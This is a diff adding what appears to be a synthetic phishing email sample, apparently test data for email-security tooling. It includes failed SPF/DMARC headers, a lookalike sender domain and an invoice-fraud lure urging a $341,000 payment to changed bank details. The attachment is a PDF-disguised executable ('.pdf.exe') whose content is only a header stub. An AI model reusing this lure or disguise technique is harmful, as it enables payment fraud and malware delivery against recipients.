@@ -1,0 +1,67 @@
+From: "Aurora Freight Accounts" <billing@docusign-review.click>
+To: Ananya Reddy <ananya.reddy@summitfoods.co.in>
+Subject: Remittance advice INV-2025-8937 - action required
+Date: Wed, 13 May 2026 02:35:00 +0000
+Message-ID: <178772093958.6.3149184250314458113@docusign-review.click>
+Return-Path: <bounce-5539@docusign-review.click>
+MIME-Version: 1.0
+Received: from smtp-out-3.example (smtp-out-3.example [192.0.2.44]) by
+ mx.summitfoods.co.in (Postfix) with ESMTPS id F6BB37C5221E for
+ <recipient@summitfoods.co.in>; Wed, 13 May 2026 02:35:00 +0000
+Received: from mx1.mail-relay.example (mx1.mail-relay.example [192.0.2.10]) by
+ smtp-out-3.example (Postfix) with ESMTPS id 0F3C0C99957B; Wed, 13 May 2026
+ 02:34:49 +0000
+Received-SPF: fail (mailfrom) identity=mailfrom; client-ip=198.51.100.89;
+ envelope-from=<bounce@docusign-review.click>;
+Authentication-Results: mx.docusign-review.click; spf=fail
+ smtp.mailfrom=docusign-review.click; dkim=none
+ header.d=docusign-review.click; dmarc=fail (p=reject)
+ header.from=docusign-review.click
+Content-Type: multipart/mixed; boundary="===============3016379469117867728=="
+
+--===============3016379469117867728==
+Content-Type: multipart/alternative;
+ boundary="===============4711909830385928525=="
+
+--===============4711909830385928525==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Hello Ananya,
+
+Please find attached invoice INV-2025-8937 for $341,000, now overdue. Kindly
+review the attached statement and process this payment immediately to avoid
+service interruption.
+
+If the bank details have changed since your last remittance, use the updated
+account information in the attachment.
+
+Regards,
+Ananya Menon
+Accounts Receivable, Aurora Freight
+
+--===============4711909830385928525==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><body style=3D"font-family:Segoe UI,Arial,sans-serif;font-size:14px;col=
+or:#202124"><p>Hello Ananya,</p><p>Please find attached invoice INV-2025-8937=
+ for $341,000, now overdue. Kindly review the attached statement and process =
+this payment immediately to avoid service interruption.</p><p>If the bank det=
+ails have changed since your last remittance, use the updated account informa=
+tion in the attachment.</p><p>Regards, Ananya Menon Accounts Receivable, Auro=
+ra Freight</p></body></html>
+
+--===============4711909830385928525==--
+
+--===============3016379469117867728==
+Content-Type: application/octet-stream
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="INV-2025-8937.pdf.exe"
+MIME-Version: 1.0
+
+TVqQAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFRo
+aXMgcHJvZ3JhbSBjYW5ub3QgYmUgcnVuIGluIERPUyBtb2Rl
+
+--===============3016379469117867728==--
